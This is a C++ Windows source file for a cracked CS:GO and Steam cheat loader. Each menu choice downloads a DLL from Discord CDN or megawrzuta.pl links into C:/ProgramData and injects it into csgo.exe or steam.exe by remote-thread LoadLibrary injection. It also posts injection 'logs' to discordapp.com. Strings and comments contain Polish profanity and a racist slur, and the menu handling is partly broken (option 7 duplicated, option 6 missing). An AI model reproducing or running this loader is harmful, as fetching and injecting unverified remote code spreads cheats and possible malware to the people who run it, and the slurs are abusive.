#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <string>
#include <tchar.h>
#include <stdio.h>
#include <winhttp.h>


#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winhttp.lib")

using namespace std;

DWORD GetProcID(const char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

int main()
{
    {

        HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);


        HINTERNET hConnect = WinHttpConnect(hSession,
            L"discordapp.com",
            INTERNET_DEFAULT_HTTPS_PORT,
            0);

        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
            L"POST",
            L"",
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        std::string title = "lolder ciplusplus";
        std::string desc = "aha19";
        std::string color = "16711680"; // Decimal color
        std::string request_body = "{\"username\": \"huj cie to obchodzi\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

        BOOL bResults = WinHttpSendRequest(hRequest,
            L"Content-Type: application/json\r\n",
            (DWORD)-1L,
            (LPVOID)request_body.c_str(),
            (DWORD)request_body.length(),
            (DWORD)request_body.length(),
            0);

        if (bResults) {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);








        string nicktwojkurwo;

        cout << "enter your username: ";
        cin >> nicktwojkurwo;

        cout << "welcome , " <<
            nicktwojkurwo;
        std::cout << "! ";
        std::cout << "\n";
        
        Sleep(2000);

        SetConsoleTitleW(L"t.me/sticzus1337");

        Sleep(2000);
        std::cout << "\n";



        ShellExecute(NULL, "open", "https://discord.gg/bvfnzYPYzw", NULL, NULL, SW_SHOWDEFAULT);


        std::cout << "[ t.me/sticzus1337 ] welcome to the loader beta \n";

        Sleep(2000);

        std::cout << "[ t.me/sticzus1337 ] select cheat you want do load: \n";

        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);



        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);
        std::cout << "------ csgo page ------\n";


        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[1] fatality crack\n";

        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[2] pandora crack\n";

        SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[3] airflow crack\n";

       
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "[4] onetap v3 crack\n";


        SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[5] plaguecheat crack\n";

       
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);
        std::cout << "------ steam_module page ------\n";

        SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[6] plaguecheat (steam_module) \n";

        
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[7] pandora (steam_module)\n";

       
        SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::cout << "[8] airflow (steam_module)\n";

       
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);
        std::cout << "------  ------\n";

        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);



        std::cout << "\n";


        char input;
        std::cin >> input;

        if (input == '1')
        {



            std::cout << "\n[+] waiting for game.\n";
            std::cout << "\n";


            string dwnld_URL = "https://cdn.discordapp.com/attachments/1240991221057589268/1240991292981252137/femordial.dll?ex=664892b4&is=66474134&hm=4cbfc027261b11b482d0e9ece6f659d4a77662272b45054c95f524a5351a7d0f&"; // link do pobrania dll
            string savepath = "C:/ProgramData/femordial.dll"; // dllka i cuhj ci w dupe
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/femordial.dll"; // sciezka do injecta xdlol
            const char* procName = "csgo.exe"; // proces gry 
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }




            std::cout << "\n[+] game has been found\n"; 
            Sleep(13500);


            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected\n";



          // logi inject


            HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);


            HINTERNET hConnect = WinHttpConnect(hSession,
                L"discordapp.com",
                INTERNET_DEFAULT_HTTPS_PORT,
                0);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                L"POST",
                L"",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);

            std::string title = "fatality ;3 ";
            std::string desc = "? **Fatality zostalo zinjectowane**";
            std::string color = "16711680"; // Decimal color
            std::string request_body = "{\"username\": \"fatality logs by sticzus\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

            BOOL bResults = WinHttpSendRequest(hRequest,
                L"Content-Type: application/json\r\n",
                (DWORD)-1L,
                (LPVOID)request_body.c_str(),
                (DWORD)request_body.length(),
                (DWORD)request_body.length(),
                0);

            if (bResults) {
                WinHttpReceiveResponse(hRequest, NULL);
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);







            Sleep(9000);
        }
        if (input == '2')
        {

            std::cout << "\n[+] waiting for game.\n";;
            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://cdn.discordapp.com/attachments/1240991221057589268/1240996657324101642/pandora_desync.dll?ex=664897b3&is=66474633&hm=a3eb0031848c5b3eec7c355abdf684571c08cf950266f974c57042a64ecae27e&"; // url to download
            string savepath = "C:/ProgramData/pandora_desync.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/pandora_desync.dll"; // path your dll
            const char* procName = "csgo.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }



            std::cout << "\n[+] game has been found\n";

            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";





            // logi inject


            HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);


            HINTERNET hConnect = WinHttpConnect(hSession,
                L"discordapp.com",
                INTERNET_DEFAULT_HTTPS_PORT,
                0);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                L"POST",
                L"",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);

            std::string title = "pandora.gg ;3 ";
            std::string desc = "? **pandora crack zostalo zinjectowane**";
            std::string color = "1127128"; // Decimal color
            std::string request_body = "{\"username\": \"pandorka logs by sticzus\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

            BOOL bResults = WinHttpSendRequest(hRequest,
                L"Content-Type: application/json\r\n",
                (DWORD)-1L,
                (LPVOID)request_body.c_str(),
                (DWORD)request_body.length(),
                (DWORD)request_body.length(),
                0);

            if (bResults) {
                WinHttpReceiveResponse(hRequest, NULL);
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);







            Sleep(9000);

        }
        if (input == '3')
        {

            std::cout << "\n[+] waiting for game.\n";;
            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://cdn.discordapp.com/attachments/1240991221057589268/1240995890005807175/airflow.dll?ex=664896fc&is=6647457c&hm=dcb9ef6a7e0fd94a92b5c5e90abfd2970b9913855c1ee13b6a885fc4bffc8ffe&"; // url to download
            string savepath = "C:/ProgramData/airflow.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/airflow.dll"; // path your dll
            const char* procName = "csgo.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }


            std::cout << "\n[+] game has been found\n";


            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";

            Sleep(9000);






            // logi inject


            HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);


            HINTERNET hConnect = WinHttpConnect(hSession,
                L"discordapp.com",
                INTERNET_DEFAULT_HTTPS_PORT,
                0);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                L"POST",
                L"",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);

            std::string title = "airflow ;3 ";
            std::string desc = "? **airflow crack zostalo zinjectowane**";
            std::string color = "1127128"; // Decimal color
            std::string request_body = "{\"username\": \"airflow logs by sticzus\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

            BOOL bResults = WinHttpSendRequest(hRequest,
                L"Content-Type: application/json\r\n",
                (DWORD)-1L,
                (LPVOID)request_body.c_str(),
                (DWORD)request_body.length(),
                (DWORD)request_body.length(),
                0);

            if (bResults) {
                WinHttpReceiveResponse(hRequest, NULL);
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);







            Sleep(9000);




        }
        if (input == '4')
        {

            std::cout << "\n[+] waiting for game.\n";;
            std::cout << "\n[ t.me/sticzus1337 ] najlepzy cheat fr\n";
            Sleep(4500);
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";
            std::cout << "\n[ t.me/sticzus1337 ] huj\n";

            Sleep(1500);
            std::cout << "\n[ t.me/sticzus1337 ] jebac czarne kurwy<3\n";


            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://megawrzuta.pl/files/105b787fb16b1b7993d814290eb109b8.dll"; 
            string savepath = "C:/ProgramData/oneshit.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/oneshit.dll"; 
            const char* procName = "csgo.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }






            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";



            std::cout << "\n[ t.me/sticzus1337 ] kc dawis to dla ciebie<3\n";
            Sleep(13500);





            // logi inject


            HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);


            HINTERNET hConnect = WinHttpConnect(hSession,
                L"discordapp.com",
                INTERNET_DEFAULT_HTTPS_PORT,
                0);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                L"POST",
                L"",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);

            std::string title = "onetap v3 ;3 ";
            std::string desc = "? **otcv3 zostalo zinjectowane**";
            std::string color = "1127128"; // Decimal color
            std::string request_body = "{\"username\": \"otc logs by sticzus\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

            BOOL bResults = WinHttpSendRequest(hRequest,
                L"Content-Type: application/json\r\n",
                (DWORD)-1L,
                (LPVOID)request_body.c_str(),
                (DWORD)request_body.length(),
                (DWORD)request_body.length(),
                0);

            if (bResults) {
                WinHttpReceiveResponse(hRequest, NULL);
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);







            Sleep(9000);






        }


        if (input == '5')
        {


            std::cout << "\n[+] waiting for game.\n";
            std::cout << "\n";


            string dwnld_URL = "https://megawrzuta.pl/files/54ab27d2326e0f2b1bd41c90e09d5226.dll"; // link do pobrania dll
            string savepath = "C:/ProgramData/pgc.dll"; // dllka i cuhj ci w dupe
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/pgc.dll"; // sciezka do injecta xdlol
            const char* procName = "csgo.exe"; // proces gry 
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }




            std::cout << "\n[+] game has been found\n";
            Sleep(13500);


            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected\n";



            // logi inject


            HINTERNET hSession = WinHttpOpen(L"sticzus7/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0);


            HINTERNET hConnect = WinHttpConnect(hSession,
                L"discordapp.com",
                INTERNET_DEFAULT_HTTPS_PORT,
                0);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                L"POST",
                L"",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);

            std::string title = "plaguecheat ;3 ";
            std::string desc = "? **plague zostalo zinjectowane**";
            std::string color = "1127128"; // Decimal color
            std::string request_body = "{\"username\": \"plague logs by sticzus\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"elo\"},\"color\": " + color + " }], \"attachments\": []}";

            BOOL bResults = WinHttpSendRequest(hRequest,
                L"Content-Type: application/json\r\n",
                (DWORD)-1L,
                (LPVOID)request_body.c_str(),
                (DWORD)request_body.length(),
                (DWORD)request_body.length(),
                0);

            if (bResults) {
                WinHttpReceiveResponse(hRequest, NULL);
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);







            Sleep(9000);
        }



        if (input == '7')
        {

            std::cout << "\n[ t.me/sticzus1337 ] chuj\n";
            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://megawrzuta.pl/files/49469b015cae7da4aa0356bf83c97891.dll"; // url to download
            string savepath = "C:/ProgramData/steamodkurwaplague.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/steamodkurwaplague.dll"; // path your dll
            const char* procName = "steam.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }

            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";

            Sleep(9000);
        }




        if (input == '7')
        {

            std::cout << "\n[ t.me/sticzus1337 ] chuj\n";
            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://cdn.discordapp.com/attachments/1240991221057589268/1240996783354675241/steam_module.dll?ex=664897d1&is=66474651&hm=e35134d49fa657f076e6ef930569336b35f76301e9586146c6635cca5afc36e3&"; // url to download
            string savepath = "C:/ProgramData/steam_module.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/steam_module.dll"; // path your dll
            const char* procName = "steam.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }

            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";

            Sleep(9000);
        }
        if (input == '8')
        {

            std::cout << "\n[ t.me/sticzus1337 ] chuj\n";
            std::cout << "\n";

            Sleep(3000);

            string dwnld_URL = "https://megawrzuta.pl/files/1036c22104cca4a4f361936eb4632214.dll"; // url to download
            string savepath = "C:/ProgramData/steam.dll"; // path 
            URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
            const char* dllPath = "C:/ProgramData/steam.dll"; // path your dll
            const char* procName = "steam.exe";
            DWORD procId = 0;

            while (!procId)
            {
                procId = GetProcID(procName);
                Sleep(30);
            }

            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

            if (hProc && hProc != INVALID_HANDLE_VALUE)
            {
                void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

                if (hThread)
                {
                    CloseHandle(hThread);
                }
            }

            if (hProc)
            {
                CloseHandle(hProc);
            }

            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
            std::cout << "\n[+] injected!\n";

            Sleep(9000);
        }
    }


    return 0;
}
